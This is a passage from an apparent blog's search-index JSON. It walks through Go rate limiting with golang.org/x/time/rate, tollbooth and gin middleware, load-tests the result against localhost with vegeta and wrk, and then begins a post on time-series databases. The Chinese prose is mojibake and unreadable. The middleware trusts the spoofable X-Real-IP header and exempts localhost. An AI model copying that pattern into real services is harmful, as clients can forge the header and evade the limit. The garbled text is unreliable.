{\n\t\t\ttime.Sleep(time.Second / 3)\n\t\t\tfmt.Println(\"false\", time.Now().Format(\"2006-01-02 15:04:05\"))\n\t\t}\n\t}\n}\n\n\nok 2023-09-11 17:07:53\nok 2023-09-11 17:07:53\nok 2023-09-11 17:07:53\nfalse 2023-09-11 17:07:53\nfalse 2023-09-11 17:07:54\nfalse 2023-09-11 17:07:54\nok 2023-09-11 17:07:54\nfalse 2023-09-11 17:07:54\nfalse 2023-09-11 17:07:55\nfalse 2023-09-11 17:07:55\nok 2023-09-11 17:07:55\nfalse 2023-09-11 17:07:55\nfalse 2023-09-11 17:07:56\nfalse 2023-09-11 17:07:56\nok 2023-09-11 17:07:56\nfalse 2023-09-11 17:07:56\nfalse 2023-09-11 17:07:57\nfalse 2023-09-11 17:07:57\n```\n\n##### Reserve ï¼ˆè‡ªå·±æ§åˆ¶ï¼‰\n\n`Reserve` ï¼Œ ç­‰äº `ReserveN(time.Now(), 1)\n\n\n`ReserveN` å½“è°ƒç”¨å®Œæˆåï¼Œæ— è®ºä»¤ç‰Œæ˜¯å¦å……è¶³ï¼Œéƒ½ä¼šè¿”å›ä¸€ä¸ª Reservation * å¯¹è±¡\n\næˆ‘ä»¬å¯ä»¥è°ƒç”¨è¯¥å¯¹è±¡çš„ Delay() æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿”å›äº†éœ€è¦ç­‰å¾…çš„æ—¶é—´ã€‚å¦‚æœç­‰å¾…æ—¶é—´ä¸º 0 ç§’ï¼Œåˆ™è¯´æ˜ä¸ç”¨ç­‰å¾…ï¼Œè‹¥å¤§äº 0 ç§’ï¼Œåˆ™å¿…é¡»ç­‰åˆ°ç­‰å¾…æ—¶é—´ä¹‹åï¼Œæ‰èƒ½å‘åè¿›è¡Œã€‚\nå½“ç„¶ï¼Œè‹¥ä¸æƒ³ç­‰å¾…ï¼Œä½ å¯ä»¥å½’è¿˜ä»¤ç‰Œï¼Œä¸€ä¸ªéƒ½ä¸èƒ½å°‘ï¼Œè°ƒç”¨è¯¥å¯¹è±¡çš„ Cancel() æ–¹æ³•å³å¯ã€‚\n\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3)\n\n\tfor {\n\t\tr := l.ReserveN(time.Now(), 1)\n\t\ts := r.Delay()\n\t\ttime.Sleep(s)\n\t\tfmt.Println(s, time.Now().Format(\"04:05.000\"))\n\t}\n}\n\n\n\n0s 2023-09-11 17:10:47\n0s 2023-09-11 17:10:47\n0s 2023-09-11 17:10:47\n999.811042ms 2023-09-11 17:10:48\n999.675375ms 2023-09-11 17:10:49\n998.794834ms 2023-09-11 17:10:50\n998.750334ms 2023-09-11 17:10:51\n998.832875ms 2023-09-11 17:10:52\n```\n\n\n\n# 3. golangé™æµå®ç°\n\n### 3.1 å®ç°æ–¹æ¡ˆ\n\n1. uber å¼€æºåº“ä¸­åŸºäºæ¼æ¡¶ç®—æ³•å®ç°äº†ä¸€ä¸ªé™æµå™¨ã€‚æ¼æ¡¶ç®—æ³•å¯ä»¥é™åˆ¶æµé‡çš„è¯·æ±‚é€Ÿåº¦ï¼Œå¹¶èµ·åˆ°å‰Šå³°å¡«è°·çš„ä½œç”¨ã€‚ `https://github.com/uber-go/ratelimit`\n2. æ»´æ»´å¼€æºå®ç°äº†ä¸€ä¸ªå¯¹httpè¯·æ±‚çš„é™æµå™¨ä¸­é—´ä»¶ã€‚å¯ä»¥åŸºäºä»¥ä¸‹æ¨¡å¼é™æµã€‚\n   - åŸºäºIPï¼Œè·¯å¾„ï¼Œæ–¹æ³•ï¼Œheaderï¼Œæˆæƒç”¨æˆ·ç­‰é™æµ\n   - é€šè¿‡è‡ªå®šä¹‰æ–¹æ³•é™æµ\n   - è¿˜æ”¯æŒåŸºäº http header è®¾ç½®é™æµæ•°æ®\n   - å®ç°æ–¹å¼æ˜¯åŸºäº `github/go/time` å®ç°çš„ï¼Œä¸åŒç±»åˆ«çš„æ•°æ®éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªå¸¦è¶…æ—¶æ—¶é—´çš„æ•°æ®æ± ä¸­ã€‚\n   - ä»£ç åœ°å€ `https://github.com/didip/tollbooth`\n3. golang ç½‘ç»œåŒ…ä¸­è¿˜æœ‰åŸºäºä¿¡å·é‡å®ç°çš„é™æµå™¨ã€‚ `https://github.com/golang/net/blob/master/netutil/listen.go` ä¹Ÿå€¼å¾—æˆ‘ä»¬å»å­¦ä¹ ä¸‹ã€‚\n\n### 3.2 http ä»¤ç‰Œæ¡¶é™æµ\n\n```go\nfunc main() {\n\tlimiter := rate.NewLimiter(rate.Every(100*time.Millisecond), 3) // æœ€å¤š3ä¸ªä»¤ç‰Œï¼Œ1ç§’æ”¾10ä¸ª\n\thttp.HandleFunc(\"/ping\", func(w http.ResponseWriter, r *http.Request) {\n\t\tif limiter.Allow() { // do something\n\t\t\tfmt.Println(time.Now().Format(\"2006-01-02 15:04:05\"), \"say hello\")\n\t\t} else {\n\t\t\tfmt.Println(time.Now().Format(\"2006-01-02 15:04:05\"), \"limit\")\n\t\t}\n\t})\n\n\tgo func() {\n\t\tfor {\n\t\t\ttime.Sleep(time.Second)\n\t\t\tReq()\n\t\t}\n\t}()\n\n\t_ = http.ListenAndServe(\":13100\", nil)\n}\n\nfunc Req() {\n\t// 1ç§’è¯·æ±‚10æ¬¡\n\tfor i := 0; i < 10; i++ {\n\t\t_, _ = resty.New().R().Get(\"http://localhost:13100/ping\")\n\t}\n}\n\n\n\n/*\n2023-09-11 17:17:44 say hello\n2023-09-11 17:17:44 say hello\n2023-09-11 17:17:44 say hello\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:44 limit\n2023-09-11 17:17:45 say hello\n2023-09-11 17:17:45 say hello\n2023-09-11 17:17:45 say hello\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:45 limit\n2023-09-11 17:17:46 say hello\n2023-09-11 17:17:46 say hello\n2023-09-11 17:17:46 say hello\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n2023-09-11 17:17:46 limit\n*/\n```\n\n+ å¦‚æœ1ç§’æ”¾10ä¸ªï¼Œæœ€å¤šå­˜10ä¸ªã€‚é‚£ä¹ˆæ¯ä¸€ç§’å¯ä»¥æ‰“å°10ä¸ªsayhelloã€‚\n+ å¦‚æœ1ç§’æ”¾1ä¸ªï¼Œæœ€å¤šå­˜10ä¸ªã€‚ç¬¬ä¸€æ¬¡10ä¸ªsayhelloï¼Œåé¢æ¯ä¸€ç§’ä¸€ä¸ªsayhelloã€‚\n\n### 3.3 Gin ä¸­é—´ä»¶é™æµ\n\n```go\npackage main\n\nimport (\n\t\"time\"\n\n\t\"github.com/didip/tollbooth\"\n\t\"github.com/didip/tollbooth/limiter\"\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc main() {\n\tr := gin.New()\n\n\tlmt := tollbooth.NewLimiter(1, &limiter.ExpirableOptions{DefaultExpirationTTL: time.Second * 5})\n\tlmt.SetIPLookups([]string{\"RemoteAddr\", \"X-Forwarded-For\", \"X-Real-IP\"})\n\tlmt.SetMethods([]string{\"POST\", \"GET\"}) //æ”¾å¼€æ›´ç²¾å‡†é™åˆ¶ï¼Œä½†æ˜¯ä¹Ÿæ”¾æ¾äº†æµé‡ã€‚\n\n\tr.Use(LimitHandler(lmt))\n\tr.GET(\"/\", func(c *gin.Context) {\n\t\tc.String(200, \"Get Hello, world!\")\n\t})\n\tr.POST(\"/\", func(c *gin.Context) {\n\t\tc.String(200, \"Post Hello, world!\")\n\t})\n\tr.Run(\":12345\")\n}\n\nfunc LimitHandler(lmt *limiter.Limiter) gin.HandlerFunc {\n\treturn func(c *gin.Context) {\n\t\thttpError := tollbooth.LimitByRequest(lmt, c.Writer, c.Request)\n\t\tif httpError != nil {\n\t\t\tc.Data(httpError.StatusCode, lmt.GetMessageContentType(), []byte(httpError.Message))\n\t\t\tc.Abort()\n\t\t} else {\n\t\t\tc.Next()\n\t\t}\n\t}\n}\n```\n\n\n\n##### æ ¹æ® IP å’Œ ReqPath ç­‰é…ç½®é™æµ\n\n```go\n//\"github.com/didip/tollbooth\"\n//\"github.com/didip/tollbooth/errors\"\n// github.com/didip/tollbooth/limiter\"\n\nlmt := tollbooth.NewLimiter(10, &limiter.ExpirableOptions{ // æ¯ç§’ 10 ä¸ªè¯·æ±‚\n\t\tDefaultExpirationTTL: time.Hour * 24, // tokenè¿‡æœŸçš„æ—¶é—´ï¼Œæ”¾åœ¨cacheé‡Œï¼Œå¯ä»¥èŠ‚çœå†…å­˜\n})\n\nfunc wrapGinLimitHandler(lmt *limiter.Limiter) gin.HandlerFunc {\n  limitOptions := []string{\"ip\",\"token\",\"device\",\"version\",\"platform\",\"lang\"}\n\tallowPathList := configure.Global.HttpConfig.AllowPathList\n\tdenyPathList := configure.Global.HttpConfig.DenyPathList\n\treturn func(c *gin.Context) {\n\t\tpath := c.Request.URL.Path\n\t\t// allow and deny path list config\n\t\tfor _, v := range allowPathList {\n\t\t\tif strings.Contains(path, v) {\n\t\t\t\tc.Next()\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t\tfor _, v := range denyPathList {\n\t\t\tif path == v {\n\t\t\t\thttpError := &errors.HTTPError{Message: lmt.GetMessage(), StatusCode: lmt.GetStatusCode()}\n\t\t\t\tc.Data(httpError.StatusCode, lmt.GetMessageContentType(), []byte(httpError.Message))\n\t\t\t\tc.Abort()\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\n\t\t// get remote ip\n\t\tremoteIP := c.Request.Header.Get(\"X-Real-IP\")\n\t\tif remoteIP == \"\" {\n\t\t\tremoteIP = c.ClientIP()\n\t\t}\n\t\t// filter ips\n\t\tif remoteIP == \"127.0.0.1\" || remoteIP == \"localhost\" {\n\t\t\tc.Next()\n\t\t\treturn\n\t\t}\n\n\t\t// get limit keys\n\t\tvar keys []string\n\t\tfor _, v := range limitOptions {\n\t\t\tif strings.Contains(v, \"ip\") {\n\t\t\t\tkeys = append(keys, remoteIP)\n\t\t\t} else if strings.Contains(v, \"token\") {\n\t\t\t\ttoken := c.GetHeader(\"Token\")\n\t\t\t\tif token == \"\" {\n\t\t\t\t\ttoken = c.GetHeader(\"Access-Token\")\n\t\t\t\t}\n\t\t\t\tkeys = append(keys, token)\n\t\t\t} else if strings.Contains(v, \"device\") {\n\t\t\t\tkeys = append(keys, c.GetHeader(\"Device-Id\"))\n\t\t\t} else if strings.Contains(v, \"version\") {\n\t\t\t\tkeys = append(keys, c.GetHeader(\"Appversion\"))\n\t\t\t} else if strings.Contains(v, \"platform\") {\n\t\t\t\tkeys = append(keys, c.GetHeader(\"Platform\"))\n\t\t\t} else if strings.Contains(v, \"lang\") {\n\t\t\t\tkeys = append(keys, c.GetHeader(\"Lang\"))\n\t\t\t}\n\t\t}\n\t\t// if null default ip\n\t\tif len(keys) == 0 {\n\t\t\tkeys = append(keys, remoteIP)\n\t\t}\n\t\t// keys included path\n\t\tkeys = append(keys, path)\n\n\t\t// limit by keys\n\t\thttpError := tollbooth.LimitByKeys(lmt, keys)\n\t\tif httpError != nil {\n\t\t\tstrKeys := path\n\t\t\tlqlog.WarnCtx(c.Request.Context(), \"[wrapGinLimitHandler] keys: (%v)\", strKeys)\n\t\t\tc.Data(httpError.StatusCode, lmt.GetMessageContentType(), []byte(httpError.Message))\n\t\t\tif _, ok := LimitKeysMap.Load(strKeys); ok {\n\t\t\t\t// nothing\n\t\t\t} else {\n\t\t\t\tLimitKeysMap.Store(strKeys, \"1\")\n\t\t\t\ttext := fmt.Sprintf(`\"%s %s\" trigger http limit,  keys:%+v`, c.Request.Method, path, keys)\n\t\t\t\ttext += fmt.Sprintf(\"\\nAppversion: %v\", c.GetHeader(\"Appversion\"))\n\t\t\t\ttext += fmt.Sprintf(\"\\nPlatform: %v\", c.GetHeader(\"Platform\"))\n\t\t\t\tFeishuAlarmText(c, text)\n\t\t\t}\n\t\t\tc.Abort()\n\t\t} else {\n\t\t\tc.Next()\n\t\t}\n\t}\n}\n\n```\n\n##### æ ¹æ® IP Rediså…¨å±€é™æµ\n\n```go\n// ratelimit \"github.com/JGLTechnologies/gin-rate-limit\"\nrequest.POST(\"/create_info\", middleware.LimitIPRate(time.Hour*6, 3), handler.AddUserInfo)\n\n\nfunc LimitIPRate(rate time.Duration, limit uint) gin.HandlerFunc {\n\tif !configure.Global.HttpConfig.IPRateLimit {\n\t\treturn func(c *gin.Context) { c.Next() }\n\t}\n\n\t// æœ¬åœ°æµ‹è¯•éœ€è¦å…³é—­\n\tskipFunc := func(c *gin.Context) bool {\n\t\tremoteIP := GetGinClientIP(c)\n    if remoteIP == \"127.0.0.1\" || remoteIP == \"localhost\" {\n\t\t\treturn true\n\t\t}\n\t\treturn false\n\t}\n\n\t// å†…å­˜é™åˆ¶\n\t//store := ratelimit.InMemoryStore(&ratelimit.InMemoryOptions{Rate: rate, Limit: limit, Skip: skipFunc})\n\t// Redisé™åˆ¶\n\tstore := ratelimit.RedisStore(&ratelimit.RedisOptions{RedisClient: dao.LimitRedisClient, Rate: rate, Limit: limit, Skip: skipFunc})\n\n\tmw := ratelimit.RateLimiter(store, &ratelimit.Options{\n\t\tErrorHandler: func(c *gin.Context, info ratelimit.Info) {\n\t\t\tc.String(429, \"Too many requests. Try again in \"+time.Until(info.ResetTime).String())\n\t\t\tkey := \"LimitIPRate\" + c.ClientIP() + c.FullPath()\n\t\t\tif _, ok := LimitKeysMap.Load(key); !ok {\n\t\t\t\tLimitKeysMap.Store(key, \"1\")\n\t\t\t\ttext := fmt.Sprintf(`\"%s %s\" trigger ipRate limit`, c.Request.Method, key)\n\t\t\t\ttext += fmt.Sprintf(\"\\nAppversion: %v\", c.GetHeader(\"Appversion\"))\n\t\t\t\ttext += fmt.Sprintf(\"\\nPlatform: %v\", c.GetHeader(\"Platform\"))\n\t\t\t\tlqlog.WarnCtx(c, text)\n\t\t\t}\n\t\t},\n\t\tKeyFunc: func(c *gin.Context) string {\n\t\t\treturn \"LimitIPRate:\" + GetGinClientIP(c)\n\t\t},\n\t})\n\treturn mw\n}\n\nfunc GetGinClientIP(c *gin.Context) string {\n\tremoteIP := c.Request.Header.Get(\"X-Real-IP\")\n\tif remoteIP == \"\" {\n\t\tremoteIP = c.ClientIP()\n\t}\n\treturn remoteIP\n}\n\n```\n\n### 3.4 vegetaæµ‹è¯•\n\n\næœ‰ä¸€ä¸ªéå¸¸æ£’çš„å·¥å…·ç§°ä½œ vegetaï¼Œæˆ‘å–œæ¬¢åœ¨ HTTP è´Ÿè½½æµ‹è¯•ä¸­ä½¿ç”¨ï¼ˆå®ƒä¹Ÿæ˜¯ç”¨ Go ç¼–å†™çš„ï¼‰ã€‚\n\n```bash\nbrew install vegeta\n```\n\næˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç®€å•çš„é…ç½®æ–‡ä»¶ï¼Œå£°æ˜æˆ‘ä»¬æƒ³è¦å‘é€çš„è¯·æ±‚ã€‚\n\n```\nGET http://localhost:12345/\n```\n\nç„¶åï¼Œä»¥æ¯ä¸ªæ—¶é—´å•å…ƒ 100 ä¸ªè¯·æ±‚çš„é€Ÿç‡æ”»å‡» 10 ç§’ã€‚\n\n```bash\nvegeta attack -duration=10s -rate=100 -targets=vegeta.conf | vegeta report\n\necho \"http://localhost:12345\" | vegeta attack -rate=500 -connections=100 -duration=10s | tee results.bin | vegeta report\n\n\n// vegeta attack -duration=10s -rate=100 -targets=vegeta.conf | vegeta report      1såªæˆåŠŸäº†ä¸€ä¸ª\n// Status Codes  [code:count]                      200:10  429:990\n```\n\nç»“æœï¼Œä½ å°†çœ‹åˆ°ä¸€äº›è¯·æ±‚è¿”å› 200ï¼Œä½†å¤§å¤šæ•°è¿”å› 429ã€‚\n\n### 3.5 wrkæµ‹è¯•\n\nå…ˆåœ¨æœ¬åœ°å®‰è£…wrkã€‚\n\n```bash\ngit clone https://github.com/wg/wrk\ncd wrk\nmake\nln -s $PWD/wrk /usr/local/bin/\n```\n\næˆ‘çš„macæ˜¯6æ ¸ï¼Œçº¿ç¨‹æ•°ä¸è¦å¤ªå¤šï¼Œæ˜¯æ ¸æ•°çš„ 2 åˆ° 4 å€å³å¯ã€‚\n\n```bash\nwrk -t6 -c10 -d10s  --latency http://127.0.0.1:9061/health\n\n\nRunning 10s test @ http://127.0.0.1:9061/health\n  6 threads and 10 connections\n  Thread Stats   Avg      Stdev     Max   +/- Stdev\n    Latency     1.28ms   14.43ms 399.37ms   99.59%\n    Req/Sec     2.06k   262.21     2.72k    84.25%\n  Latency Distribution\n     50%  448.00us\n     75%  620.00us\n     90%  797.00us\n     99%    1.38ms\n  123958 requests in 10.10s, 20.21MB read\n  Non-2xx or 3xx responses: 123847\nRequests/sec:  12270.53\nTransfer/sec:      2.00MB\n\n# é™æµåï¼Œå¯ä»¥çœ‹åˆ°ï¼Œä¸€å…±123958ä¸ªï¼Œ å¤±è´¥äº† 123847 ä¸ª\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://learnku.com/articles/57900\n+ https://studygolang.com/articles/33988\n","tags":["golang"],"categories":["4_golangå®æˆ˜"]},{"title":"æ—¶åºæ•°æ®åº“ç®€ä»‹","url":"%2Fp%2F27b2e776.html","content":"\n\n\n# 1. æ—¶é—´åºåˆ—æ•°æ®åº“ Time Series Database (TSDB)\n\néšç€åˆ†å¸ƒå¼ç³»ç»Ÿç›‘æ§ã€ç‰©è”ç½‘çš„å‘å±•ï¼ŒTSDBå¼€å§‹å—åˆ°æ›´å¤šçš„å…³æ³¨ã€‚\n\næ—¶é—´åºåˆ—æ•°æ®è·Ÿå…³ç³»å‹æ•°æ®åº“æœ‰å¤ªå¤šä¸åŒï¼Œä½†æ˜¯å¾ˆå¤šå…¬å¸å¹¶ä¸æƒ³æ”¾å¼ƒå…³ç³»å‹æ•°æ®åº“ã€‚ äºæ˜¯å°±äº§ç”Ÿäº†ä¸€äº›ç‰¹æ®Šçš„ç”¨æ³•ï¼Œæ¯”å¦‚ç”¨ MySQL çš„ VividCortex, ç”¨ Postgres çš„ Timescaleã€‚ å¾ˆå¤šäººè§‰å¾—ç‰¹æ®Šçš„é—®é¢˜éœ€è¦ç‰¹æ®Šçš„è§£å†³æ–¹æ³•ï¼Œäºæ˜¯å¾ˆå¤šæ—¶é—´åºåˆ—æ•°æ®åº“ä»å¤´å†™èµ·ï¼Œä¸ä¾èµ–ä»»ä½•ç°æœ‰çš„æ•°æ®åº“, æ¯”å¦‚ Graphiteï¼ŒInfluxDBã€‚\n\n<!-- more -->\n\n### 1.1 æ—¶åºæ¦‚å¿µ\n\næ—¶åºæ•°æ®æ˜¯åŸºäºæ—¶é—´çš„ä¸€ç³»åˆ—çš„æ•°æ®ã€‚åœ¨æœ‰æ—¶é—´çš„åæ ‡ä¸­å°†è¿™äº›æ•°æ®ç‚¹è¿æˆçº¿ï¼Œå¾€è¿‡å»çœ‹å¯ä»¥åšæˆå¤šçº¬åº¦æŠ¥è¡¨ï¼Œæ­ç¤ºå…¶è¶‹åŠ¿æ€§ã€è§„å¾‹æ€§ã€å¼‚å¸¸æ€§ï¼›å¾€æœªæ¥çœ‹å¯ä»¥åšå¤§æ•°æ®åˆ†æï¼Œæœºå™¨å­¦ä¹ ï¼Œå®ç°é¢„æµ‹å’Œé¢„è­¦ã€‚\n\næ—¶åºæ•°æ®åº“å°±æ˜¯å­˜æ”¾æ—¶åºæ•°æ®çš„æ•°æ®åº“ï¼Œå¹¶ä¸”éœ€è¦æ”¯æŒæ—¶åºæ•°æ®çš„å¿«é€Ÿå†™å…¥ã€æŒä¹…åŒ–ã€å¤šçº¬åº¦çš„èšåˆæŸ¥è¯¢ç­‰åŸºæœ¬åŠŸèƒ½ã€‚\n\n### 1.2 æ•°æ®å†™å…¥ç‰¹ç‚¹\n\n+ å†™å…¥å¹³ç¨³ã€æŒç»­ã€é«˜å¹¶å‘é«˜åå\n\n  æ—¶åºæ•°æ®çš„å†™å…¥æ˜¯æ¯”è¾ƒå¹³ç¨³çš„ï¼Œè¿™ç‚¹ä¸åº”ç”¨æ•°æ®ä¸åŒï¼Œåº”ç”¨æ•°æ®é€šå¸¸ä¸åº”ç”¨çš„è®¿é—®é‡æˆæ­£æ¯”ï¼Œè€Œåº”ç”¨çš„è®¿é—®é‡é€šå¸¸å­˜åœ¨æ³¢å³°æ³¢è°·ã€‚æ—¶åºæ•°æ®çš„äº§ç”Ÿé€šå¸¸æ˜¯ä»¥ä¸€ä¸ªå›ºå®šçš„æ—¶é—´é¢‘ç‡äº§ç”Ÿï¼Œä¸ä¼šå—å…¶ä»–å› ç´ çš„åˆ¶çº¦ï¼Œå…¶æ•°æ®ç”Ÿæˆçš„é€Ÿåº¦æ˜¯ç›¸å¯¹æ¯”è¾ƒå¹³ç¨³çš„ã€‚\n\n  \n\n+ å†™å¤šè¯»å°‘\n\n  æ—¶åºæ•°æ®ä¸Š95%-99%çš„æ“ä½œéƒ½æ˜¯å†™æ“ä½œï¼Œæ˜¯å…¸å‹çš„å†™å¤šè¯»å°‘çš„æ•°æ®ã€‚è¿™ä¸å…¶æ•°æ®ç‰¹æ€§ç›¸å…³ï¼Œä¾‹å¦‚ç›‘æ§æ•°æ®ï¼Œä½ çš„ç›‘æ§é¡¹å¯èƒ½å¾ˆå¤šï¼Œä½†æ˜¯ä½ çœŸæ­£å»è¯»çš„å¯èƒ½æ¯”è¾ƒå°‘ï¼Œé€šå¸¸åªä¼šå…³å¿ƒå‡ ä¸ªç‰¹å®šçš„å…³é”®æŒ‡æ ‡æˆ–è€…åœ¨ç‰¹å®šçš„åœºæ™¯ä¸‹æ‰ä¼šå»è¯»æ•°æ®ã€‚\n\n  \n\n+ å®æ—¶å†™å…¥æœ€è¿‘ç”Ÿæˆçš„æ•°æ®ï¼Œæ— æ›´æ–°\n\n  æ—¶åºæ•°æ®çš„å†™å…¥æ˜¯å®æ—¶çš„ï¼Œä¸”æ¯æ¬¡å†™å…¥éƒ½æ˜¯æœ€è¿‘ç”Ÿæˆçš„æ•°æ®ï¼Œè¿™ä¸å…¶æ•°æ®ç”Ÿæˆçš„ç‰¹ç‚¹ç›¸å…³ï¼Œå› ä¸ºå…¶æ•°æ®ç”Ÿæˆæ˜¯éšç€æ—¶é—´æ¨è¿›çš„ï¼Œè€Œæ–°ç”Ÿæˆçš„æ•°æ®ä¼šå®æ—¶çš„è¿›è¡Œå†™å…¥ã€‚æ•°æ®å†™å…¥æ— æ›´æ–°ï¼Œåœ¨æ—¶é—´è¿™ä¸ªç»´åº¦ä¸Šï¼Œéšç€æ—¶é—´çš„æ¨è¿›ï¼Œæ¯æ¬¡æ•°æ®éƒ½æ˜¯æ–°æ•°æ®ï¼Œä¸ä¼šå­˜åœ¨æ—§æ•°æ®çš„æ›´æ–°ï¼Œä¸è¿‡ä¸æ’é™¤äººä¸ºçš„å¯¹æ•°æ®åšè®¢æ­£ã€‚\n\n\n\n### 1.3 æ•°æ®æŸ¥è¯¢å’Œåˆ†æç‰¹ç‚¹\n\n- æŒ‰æ—¶é—´èŒƒå›´è¯»å–ï¼šé€šå¸¸æ¥è¯´ï¼Œä½ ä¸ä¼šå»å…³å¿ƒæŸä¸ªç‰¹å®šç‚¹çš„æ•°æ®ï¼Œè€Œæ˜¯ä¸€æ®µæ—¶é—´çš„æ•°æ®ã€‚\n- æœ€è¿‘çš„æ•°æ®è¢«è¯»å–çš„æ¦‚ç‡é«˜\n- å†å²æ•°æ®ç²—ç²’åº¦æŸ¥è¯¢çš„æ¦‚ç‡æ\n- å¤šç§ç²¾åº¦æŸ¥è¯¢\n- å¤šç»´åº¦åˆ†æ\n\n\n\n### 1.4  æ•°æ®å­˜å‚¨çš„ç‰¹ç‚¹\n\n- æ•°æ®é‡å¤§ï¼šæ‹¿ç›‘æ§æ•°æ®æ¥ä¸¾ä¾‹ï¼Œå¦‚æœæˆ‘ä»¬é‡‡é›†çš„ç›‘æ§æ•°æ®çš„æ—¶é—´é—´éš”æ˜¯1sï¼Œé‚£ä¸€ä¸ªç›‘æ§é¡¹æ¯å¤©ä¼šäº§ç”Ÿ86400ä¸ªæ•°æ®ç‚¹ï¼Œè‹¥æœ‰10000ä¸ªç›‘æ§é¡¹ï¼Œåˆ™ä¸€å¤©å°±ä¼šäº§ç”Ÿ864000000ä¸ªæ•°æ®ç‚¹ã€‚åœ¨ç‰©è”ç½‘åœºæ™¯ä¸‹ï¼Œè¿™ä¸ªæ•°å­—ä¼šæ›´å¤§ã€‚æ•´ä¸ªæ•°æ®çš„è§„æ¨¡ï¼Œæ˜¯TBç”šè‡³æ˜¯PBçº§çš„ã€‚\n- å†·çƒ­åˆ†æ˜ï¼šæ—¶åºæ•°æ®æœ‰éå¸¸å…¸å‹çš„å†·çƒ­ç‰¹å¾ï¼Œè¶Šæ˜¯å†å²çš„æ•°æ®ï¼Œè¢«æŸ¥è¯¢å’Œåˆ†æçš„æ¦‚ç‡è¶Šä½ã€‚\n- å…·æœ‰æ—¶æ•ˆæ€§ï¼šæ—¶åºæ•°æ®å…·æœ‰æ—¶æ•ˆæ€§ï¼Œæ•°æ®é€šå¸¸ä¼šæœ‰ä¸€ä¸ªä¿å­˜å‘¨æœŸï¼Œè¶…è¿‡è¿™ä¸ªä¿å­˜å‘¨æœŸçš„æ•°æ®å¯ä»¥è®¤ä¸ºæ˜¯å¤±æ•ˆçš„ï¼Œå¯ä»¥è¢«å›æ”¶ã€‚ä¸€æ–¹é¢æ˜¯å› ä¸ºè¶Šæ˜¯å†å²çš„æ•°æ®ï¼Œå¯åˆ©ç”¨çš„ä»·å€¼è¶Šä½ï¼›å¦ä¸€æ–¹é¢æ˜¯ä¸ºäº†èŠ‚çœå­˜å‚¨æˆæœ¬ï¼Œä½ä»·å€¼çš„æ•°æ®å¯ä»¥è¢«æ¸…ç†ã€‚\n- å¤šç²¾åº¦æ•°æ®å­˜å‚¨ï¼šåœ¨æŸ¥è¯¢çš„ç‰¹ç‚¹é‡Œæåˆ°æ—¶åºæ•°æ®å‡ºäºå­˜å‚¨æˆæœ¬å’ŒæŸ¥è¯¢æ•ˆç‡çš„è€ƒè™‘ï¼Œä¼šéœ€è¦ä¸€ä¸ªå¤šç²¾åº¦çš„æŸ¥è¯¢ï¼ŒåŒæ ·ä¹Ÿéœ€è¦ä¸€ä¸ªå¤šç²¾åº¦æ•°æ®çš„å­˜å‚¨ã€‚\n\n\n\n# 2. æ•°æ®\n\n### 2.1 æ•°æ®æ¨¡å‹\n\næ—¶é—´åºåˆ—æ•°æ®å¯ä»¥åˆ†æˆä¸¤éƒ¨åˆ†\n\n- åºåˆ— ï¼šå°±æ˜¯æ ‡è¯†ç¬¦ï¼ˆç»´åº¦ï¼‰ï¼Œä¸»è¦çš„ç›®çš„æ˜¯æ–¹ä¾¿è¿›è¡Œæœç´¢å’Œç­›é€‰\n\n- æ•°æ®ç‚¹ï¼šæ—¶é—´æˆ³å’Œæ•°å€¼æ„æˆçš„æ•°ç»„\n\n  è¡Œå­˜ï¼šä¸€ä¸ªæ•°ç»„åŒ…å«å¤šä¸ªç‚¹ï¼Œå¦‚ [{t: 2017-09-03-21:24:44, v: 0.1002}, {t: 2017-09-03-21:24:45, v: 0.1012}]\n\n  åˆ—å­˜ï¼šä¸¤ä¸ªæ•°ç»„ï¼Œä¸€ä¸ªå­˜æ—¶é—´æˆ³ï¼Œä¸€ä¸ªå­˜æ•°å€¼ï¼Œå¦‚[ 2017-09-03-21:24:44, 2017-09-03-21:24:45], [0.1002,  0.1012]\n   *ä¸€èˆ¬æƒ…å†µä¸‹ï¼šåˆ—å­˜èƒ½æœ‰æ›´å¥½çš„å‹ç¼©ç‡å’ŒæŸ¥è¯¢æ€§èƒ½*\n\n### 2.2 åŸºæœ¬æ¦‚å¿µ\n\n- metric: åº¦é‡ï¼Œç›¸å½“äºå…³ç³»å‹æ•°æ®åº“ä¸­çš„tableã€‚\n- data point: æ•°æ®ç‚¹ï¼Œç›¸å½“äºå…³ç³»å‹æ•°æ®åº“ä¸­çš„rowã€‚\n- timestampï¼šæ—¶é—´æˆ³ï¼Œä»£è¡¨æ•°æ®ç‚¹äº§ç”Ÿçš„æ—¶é—´ã€‚\n- field: åº¦é‡ä¸‹çš„ä¸åŒå­—æ®µã€‚æ¯”å¦‚ä½ç½®è¿™ä¸ªåº¦é‡å…·æœ‰ç»åº¦å’Œçº¬åº¦ä¸¤ä¸ªfieldã€‚ä¸€èˆ¬æƒ…å†µä¸‹å­˜æ”¾çš„æ˜¯ä¼šéšç€æ—¶é—´æˆ³çš„å˜åŒ–è€Œå˜åŒ–çš„æ•°æ®ã€‚\n- tag: æ ‡ç­¾ï¼Œæˆ–è€…é™„åŠ ä¿¡æ¯ã€‚ä¸€èˆ¬å­˜æ”¾çš„æ˜¯å¹¶ä¸éšç€æ—¶é—´æˆ³å˜åŒ–çš„å±æ€§ä¿¡æ¯ã€‚timestampåŠ ä¸Šæ‰€æœ‰çš„tagså¯ä»¥è®¤ä¸ºæ˜¯tableçš„primary 